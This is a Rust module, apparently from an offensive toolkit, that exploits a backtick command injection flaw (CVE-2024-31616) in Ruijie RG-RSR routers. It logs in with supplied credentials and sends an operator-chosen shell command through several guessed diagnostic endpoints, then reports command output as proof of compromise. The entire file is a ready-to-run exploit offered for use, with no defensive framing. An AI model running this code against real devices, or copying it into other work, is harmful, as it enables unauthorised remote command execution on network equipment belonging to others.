use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, prompt_default, normalize_target};

/// Ruijie RG-RSR Router Command Injection (CVE-2024-31616)
/// 
/// Affects: RSR10-01G-T-S / RSR_3.0(1)B9P2
/// Arbitrary command execution via backtick injection in web management
/// Reference: github.com gist by security researcher

const TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_target = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    
    let normalized = normalize_target(&raw_target)?;
    let base_url = if normalized.contains("://") {
        normalized.clone()
    } else {
        format!("http://{}", normalized)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // Authentication is typically required
    let username = prompt_default("Username", "admin")?;
    let password = prompt_required("Password")?;
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .cookie_store(true)
        .build()?;
    
    // First authenticate
    println!("{} Authenticating...", "[*]".blue());
    
    let login_url = format!("{}/login.cgi", base_url.trim_end_matches('/'));
    let login_payload = serde_json::json!({
        "username": username,
        "password": password
    });
    
    let login_res = client.post(&login_url)
        .json(&login_payload)
        .send()
        .await;
        
    match login_res {
        Ok(r) if r.status().is_success() => {
            println!("{} Authentication successful!", "[+]".green());
        },
        Ok(r) => {
            println!("{} Login returned HTTP {}. Continuing anyway...", "[!]".yellow(), r.status());
        },
        Err(e) => {
            println!("{} Login failed: {}. Continuing anyway...", "[!]".yellow(), e);
        }
    }
    
    // Command injection via backtick
    // The vulnerability is in various diagnostic endpoints
    let injection = format!("`{}`", cmd);
    
    let exploit_endpoints = vec![
        format!("{}/cgi-bin/luci/admin/settings/diag?cmd=ping&ip={}", 
                base_url.trim_end_matches('/'), urlencoding::encode(&injection)),
        format!("{}/goform/RgDiagnose?cmd=ping&host={}", 
                base_url.trim_end_matches('/'), urlencoding::encode(&injection)),
        format!("{}/cgi-bin/diag.cgi?action=ping&target={}",
                base_url.trim_end_matches('/'), urlencoding::encode(&injection)),
    ];
    
    println!("{} Sending command injection payload...", "[*]".blue());
    
    for endpoint in &exploit_endpoints {
        println!("{} Trying: {}", "[*]".dimmed(), endpoint);
        
        match client.get(endpoint).send().await {
            Ok(resp) => {
                let status = resp.status();
                let text = resp.text().await.unwrap_or_default();
                
                if status.is_success() || text.contains("uid=") || text.len() > 100 {
                    println!("{} Potential command execution at endpoint!", "[+]".green().bold());
                    println!("{} Response ({} bytes):", "[*]".blue(), text.len());
                    for line in text.lines().take(20) {
                        println!("    {}", line);
                    }
                    if text.contains("uid=") || text.contains("root") {
                        println!("{} Command output detected - VULNERABLE!", "[VULN]".red().bold());
                    }
                    return Ok(());
                }
            },
            Err(e) => {
                println!("{} Failed: {}", "[*]".dimmed(), e);
            }
        }
    }
    
    println!();
    println!("{} Could not confirm exploitation.", "[*]".yellow());
    println!("{} Try manual testing with different endpoints.", "[*]".cyan());
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Ruijie RG-RSR Router Command Injection (CVE-2024-31616) ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
